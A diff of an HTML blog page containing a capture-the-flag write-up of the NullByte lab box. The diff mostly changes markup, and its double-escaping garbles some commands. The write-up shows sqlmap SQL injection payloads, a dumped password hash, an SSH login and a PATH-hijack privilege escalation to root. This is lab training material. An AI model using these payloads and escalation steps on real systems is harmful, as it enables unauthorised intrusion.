@@ -103,11 +103,11 @@ download since a while:
 
 
 <p>The goal is to root the server.</p>
-<h2 id="host-discovery">Host discovery</h2>
+<h2>Host discovery</h2>
 <p>As always, we start with the host discovery with <a href="http://nmap.org">nmap</a>,
 <a href="https://cirt.net/Nikto2">nikto</a> and
 <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a>:</p>
-<h3 id="nmap">nmap</h3>
+<h3>nmap</h3>
 <div class="highlight"><pre><span></span>nmap 192.168.0.20 -p0-65535 -A -oA nmap
 # Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20
 Nmap scan report for 192.168.0.20
@@ -137,11 +137,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 <p>There is an HTTP server on the port 80 and an ssh service on port 777.</p>
-<h2 id="exploitation">Exploitation</h2>
+<h2>Exploitation</h2>
 <p>The web server display a picture with a simple message. Neither nikto nor
 dirbuster give us some lead.  Let us run <code>exiftool</code> on the picture:</p>
-<h3 id="maingif">main.gif</h3>
-<p><img alt="main.gif" src="/media/2015.09/main.gif" /></p>
+<h3>main.gif</h3>
+<p><img alt="main.gif" src="/media/2015.09/main.gif"></p>
 <p>The comment filed is interesting:</p>
 <div class="highlight"><pre><span></span>ExifTool Version Number         : 8.60
 File Name                       : main.gif
@@ -164,7 +164,7 @@ Image Size                      : 235x302
 
 
 <p>What can we do with that?</p>
-<h3 id="kzmb5nvyjw">kzMb5nVYJw</h3>
+<h3>kzMb5nVYJw</h3>
 <p>If we put this at the end of our url with land on another page. Dirbuster will
 never have find something like that!</p>
 <p>It is a simple web page asking us for a key. When looking at the page code we
@@ -193,7 +193,7 @@ password dictionary (mostly common word).</p>
 
 
 <p>The password was "elite" and by entering it, we land on a new page.</p>
-<h3 id="420searchphp">420search.php</h3>
+<h3>420search.php</h3>
 <p>The <code>420search.php</code> page let us query for an user. If we search 'plop' we got:</p>
 <blockquote>
 <p>Fetched data successfully</p>
@@ -203,11 +203,11 @@ password dictionary (mostly common word).</p>
 <p>EMP ID :1
 EMP NAME : ramses
 EMP POSITION :</p>
-<hr />
+<hr>
 <p>EMP ID :2
 EMP NAME : isis
 EMP POSITION : employee</p>
-<hr />
+<hr>
 <p>Fetched data successfully</p>
 </blockquote>
 <p>This time it is probably a SQL injection as there is no mention against it in
@@ -218,43 +218,43 @@ that corresponds to your MySQL server version for the right syntax to use near
 '%"' at line 1</p>
 </blockquote>
 <p>It looks like an SQL injection.</p>
-<h3 id="sqli">SQLi</h3>
+<h3>SQLi</h3>
 <p>Let us launch <a href="http://sqlmap.org">sqlmap</a>:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -u &#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&#39;
-         _
- ___ ___| |_____ ___ ___  {1.0-dev-e8f87bf}
-|_ -| . | |     | .&#39;| . |
-|___|_  |_|_|_|_|__,|  _|
-      |_|           |_|   http://sqlmap.org
+<div class="highlight"><pre><span></span><span class="cp">[</span><span class="nx">maggick</span><span class="p">@</span><span class="nx">rootine</span> <span class="nx">sqlmap</span><span class="cp">]</span><span class="o">$</span> <span class="nt">python2</span> <span class="nt">sqlmap</span><span class="p">.</span><span class="nc">py</span> <span class="nt">-u</span> <span class="s1">&#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&#39;</span>
+         <span class="nt">_</span>
+ <span class="nt">___</span> <span class="nt">___</span><span class="o">|</span> <span class="o">|</span><span class="nt">_____</span> <span class="nt">___</span> <span class="nt">___</span>  <span class="p">{</span><span class="err">1.0-dev-e8f87bf</span><span class="p">}</span>
+<span class="o">|</span><span class="nt">_</span> <span class="nt">-</span><span class="o">|</span> <span class="o">.</span> <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> <span class="o">.</span><span class="s1">&#39;| . |</span>
+<span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
+<span class="s1">      |_|           |_|   http://sqlmap.org</span>
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+<span class="cp">[</span><span class="o">!</span><span class="cp">]</span><span class="s1"> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span><span class="nt">s</span> <span class="nt">responsibility</span> <span class="nt">to</span> <span class="nt">obey</span> <span class="nt">all</span> <span class="nt">applicable</span> <span class="nt">local</span><span class="o">,</span> <span class="nt">state</span> <span class="nt">and</span> <span class="nt">federal</span> <span class="nt">laws</span><span class="o">.</span> <span class="nt">Developers</span> <span class="nt">assume</span> <span class="nt">no</span> <span class="nt">liability</span> <span class="nt">and</span> <span class="nt">are</span> <span class="nt">not</span> <span class="nt">responsible</span> <span class="nt">for</span> <span class="nt">any</span> <span class="nt">misuse</span> <span class="nt">or</span> <span class="nt">damage</span> <span class="nt">caused</span> <span class="nt">by</span> <span class="nt">this</span> <span class="nt">program</span>
 
-[*] starting at 15:25:23
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nt">starting</span> <span class="nt">at</span> <span class="nt">15</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">23</span>
 
-[15:25:23] [INFO] resuming back-end DBMS &#39;mysql&#39; 
-[15:25:23] [INFO] testing connection to the target URL
-sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
----
-Parameter: usrtosearch (GET)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: usrtosearch=-8936&quot; OR 8832=8832#
+<span class="cp">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">23</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">resuming</span> <span class="nt">back-end</span> <span class="nt">DBMS</span> <span class="s1">&#39;mysql&#39;</span> 
+<span class="cp">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">23</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">testing</span> <span class="nt">connection</span> <span class="nt">to</span> <span class="nt">the</span> <span class="nt">target</span> <span class="nt">URL</span>
+<span class="nt">sqlmap</span> <span class="nt">identified</span> <span class="nt">the</span> <span class="nt">following</span> <span class="nt">injection</span> <span class="nt">points</span> <span class="nt">with</span> <span class="nt">a</span> <span class="nt">total</span> <span class="nt">of</span> <span class="nt">0</span> <span class="nt">HTTP</span><span class="o">(</span><span class="nt">s</span><span class="o">)</span> <span class="nt">requests</span><span class="o">:</span>
+<span class="nt">---</span>
+<span class="nt">Parameter</span><span class="o">:</span> <span class="nt">usrtosearch</span> <span class="o">(</span><span class="nt">GET</span><span class="o">)</span>
+    <span class="nt">Type</span><span class="o">:</span> <span class="nt">boolean-based</span> <span class="nt">blind</span>
+    <span class="nt">Title</span><span class="o">:</span> <span class="nt">OR</span> <span class="nt">boolean-based</span> <span class="nt">blind</span> <span class="nt">-</span> <span class="nt">WHERE</span> <span class="nt">or</span> <span class="nt">HAVING</span> <span class="nt">clause</span> <span class="o">(</span><span class="nt">MySQL</span> <span class="nt">comment</span><span class="o">)</span>
+    <span class="nt">Payload</span><span class="o">:</span> <span class="nt">usrtosearch</span><span class="o">=</span><span class="nt">-8936</span><span class="s2">&quot; OR 8832=8832#</span>
 
-    Type: AND/OR time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)
-    Payload: usrtosearch=plop&quot; AND (SELECT * FROM (SELECT(SLEEP(5)))bhRc)#
+<span class="s2">    Type: AND/OR time-based blind</span>
+<span class="s2">    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)</span>
+<span class="s2">    Payload: usrtosearch=plop&quot;</span> <span class="nt">AND</span> <span class="o">(</span><span class="nt">SELECT</span> <span class="o">*</span> <span class="nt">FROM</span> <span class="o">(</span><span class="nt">SELECT</span><span class="o">(</span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">)))</span><span class="nt">bhRc</span><span class="o">)</span><span class="err">#</span>
 
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 3 columns
-    Payload: usrtosearch=plop&quot; UNION ALL SELECT CONCAT(0x71706b7871,0x5355686d62645446514a,0x7162716271),NULL,NULL#
----
-[15:25:23] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian
-web application technology: Apache 2.4.10
-back-end DBMS: MySQL 5.0.12
-[15:25:23] [INFO] fetched data logged to text files under &#39;/home/maggick/.sqlmap/output/192.168.0.20&#39;
+    <span class="nt">Type</span><span class="o">:</span> <span class="nt">UNION</span> <span class="nt">query</span>
+    <span class="nt">Title</span><span class="o">:</span> <span class="nt">MySQL</span> <span class="nt">UNION</span> <span class="nt">query</span> <span class="o">(</span><span class="nt">NULL</span><span class="o">)</span> <span class="nt">-</span> <span class="nt">3</span> <span class="nt">columns</span>
+    <span class="nt">Payload</span><span class="o">:</span> <span class="nt">usrtosearch</span><span class="o">=</span><span class="nt">plop</span><span class="err">&quot;</span> <span class="nt">UNION</span> <span class="nt">ALL</span> <span class="nt">SELECT</span> <span class="nt">CONCAT</span><span class="o">(</span><span class="nt">0x71706b7871</span><span class="o">,</span><span class="nt">0x5355686d62645446514a</span><span class="o">,</span><span class="nt">0x7162716271</span><span class="o">),</span><span class="nt">NULL</span><span class="o">,</span><span class="nt">NULL</span><span class="err">#</span>
+<span class="nt">---</span>
+<span class="cp">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">23</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">the</span> <span class="nt">back-end</span> <span class="nt">DBMS</span> <span class="nt">is</span> <span class="nt">MySQL</span>
+<span class="nt">web</span> <span class="nt">server</span> <span class="nt">operating</span> <span class="nt">system</span><span class="o">:</span> <span class="nt">Linux</span> <span class="nt">Debian</span>
+<span class="nt">web</span> <span class="nt">application</span> <span class="nt">technology</span><span class="o">:</span> <span class="nt">Apache</span> <span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">10</span>
+<span class="nt">back-end</span> <span class="nt">DBMS</span><span class="o">:</span> <span class="nt">MySQL</span> <span class="nt">5</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">12</span>
+<span class="cp">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">23</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">fetched</span> <span class="nt">data</span> <span class="nt">logged</span> <span class="nt">to</span> <span class="nt">text</span> <span class="nt">files</span> <span class="nt">under</span> <span class="s1">&#39;/home/maggick/.sqlmap/output/192.168.0.20&#39;</span>
 
-[*] shutting down at 15:25:23
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nt">shutting</span> <span class="nt">down</span> <span class="nt">at</span> <span class="nt">15</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">23</span>
 </pre></div>
 
 
@@ -266,7 +266,7 @@ got us the list of the tables in the database <strong>seth</strong>. There is on
 +----+---------------------------------------------+--------+------------+
 | id | pass                                        | user   | position   |
 +----+---------------------------------------------+--------+------------+
-| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt;    |
 | 2  | --not allowed--                             | isis   | employee   |
 +----+---------------------------------------------+--------+------------+
 </pre></div>
@@ -277,8 +277,8 @@ got us the list of the tables in the database <strong>seth</strong>. There is on
 google search give us the associated password: <strong>omega</strong>.</p>
 <p>We have a username and a password. We have also seen a ssh port at the nmap
 stage.</p>
-<h2 id="shell-exploitation">Shell exploitation</h2>
-<h3 id="ssh">ssh</h3>
+<h2>Shell exploitation</h2>
+<h3>ssh</h3>
 <p>We try to connect to the non standard ssh port as ramses:</p>
 <div class="highlight"><pre><span></span>$ ssh 192.168.0.20 -p 777 -lramses
 ramses@192.168.0.20&#39;s password:
@@ -287,7 +287,7 @@ omega
 
 
 <p>And it works.</p>
-<h3 id="privilege-elevation">Privilege elevation</h3>
+<h3>Privilege elevation</h3>
 <p>We got a shell as a user now we need privilege escalation to become root. After
 trying <code>sudo su</code> we look at the <code>bash_history</code>:</p>
 <div class="highlight"><pre><span></span>ramses@NullByte:~$ cat .bash_history
@@ -335,7 +335,7 @@ meaning we execute this program with root privileges.</p>
 environment variable to execute a command of our choice instead of the command
 wanted by the program.</p>
 <p>First of all we create a file with the command we want to execute and name it <code>ps</code>:</p>
-<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ echo /bin/sh &gt; ~/ps
+<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ echo /bin/sh &amp;gt; ~/ps
 </pre></div>
 
 
@@ -367,7 +367,7 @@ proof.txt
 adf11c7a9e6523e630aaf3b9b7acb51d
 
 It seems that you have pwned the box, congrats.
-Now you done that I wanna talk with you. Write a walk &amp; mail at
+Now you done that I wanna talk with you. Write a walk &amp;amp; mail at
 xly0n@sigaint.org attach the walk and proof.txt
 If sigaint.org is down you may mail at nbsly0n@gmail.com
 
@@ -395,7 +395,7 @@ Gms=
 </pre></div>
 
 
-<h2 id="conclusion">Conclusion</h2>
+<h2>Conclusion</h2>
 <p>This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
 fun for us. Thank to <a href="https://twitter.com/@ly0nx">@ly0nx</a> for this box and
 <a href="http://vulnhub.com">vulnhub</a> as always.</p>
